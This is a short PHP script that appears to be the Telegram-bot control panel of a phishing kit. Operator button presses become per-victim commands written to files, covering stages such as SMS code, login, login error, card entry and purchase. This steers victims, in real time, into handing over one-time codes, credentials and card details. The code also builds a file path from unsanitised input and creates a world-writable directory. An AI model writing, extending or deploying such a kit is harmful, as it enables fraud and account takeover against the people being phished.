<?php
// ===== turquia.php =====
include("oslo.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data']; // Ej: "SMS|usuario123"
    $ci = $update['callback_query']['message']['chat']['id'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {
        list($comando, $u) = explode('|', $data);

        if (!file_exists("acciones")) {
            mkdir("acciones", 0777, true);
        }

        $ar = "acciones/$u.txt";

        switch ($comando) {
            case "SMS":
                file_put_contents($ar, "/SMS");
                break;
            case "SMSERROR":
                file_put_contents($ar, "/SMSERROR");
                break;
            case "NUMERO":
                file_put_contents($ar, "/NUMERO");
                break;
            case "ERROR":
                file_put_contents($ar, "/ERROR");
                break;
            case "LOGIN":
                file_put_contents($ar, "/LOGIN");
                break;
            case "LOGINERROR":
                file_put_contents($ar, "/LOGINERROR");
                break;
            case "CARD":
                file_put_contents($ar, "/CARD");
                break;
            case "LISTO":
                file_put_contents($ar, "/LISTO");
                break;
            case "MAIL":
                file_put_contents($ar, "/MAIL");
                break;
            case "COMPRA":
                file_put_contents($ar, "/COMPRA");
                break;
            case "TIMEFORM":
                file_put_contents($ar, "/TIMEFORM");
                break;
            default:
                file_put_contents($ar, "/ERROR");
                break;
        }

        file_get_contents("https://api.telegram.org/bot$tk/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $u",
            'show_alert' => false
        ]));
    }
}
?>
